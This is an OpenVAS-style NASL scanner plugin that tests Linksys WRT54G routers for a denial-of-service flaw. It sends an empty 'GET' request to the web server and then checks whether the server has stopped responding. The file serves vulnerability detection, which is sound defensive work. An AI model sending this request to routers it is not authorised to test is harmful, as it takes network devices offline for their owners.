if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11941" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Linksys WRT54G DoS" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.zone-h.org/en/advisories/read/id=3523/" );
	script_tag( name: "solution", value: "Upgrade your firmware." );
	script_tag( name: "summary", value: "It is possible to freeze the remote web server by
  sending an empty GET request." );
	script_tag( name: "affected", value: "This is know to affect Linksys WRT54G routers." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!port){
	exit( 0 );
}
req = "GET\r\n";
send( socket: soc, data: req );
http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port, retry: 4 )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

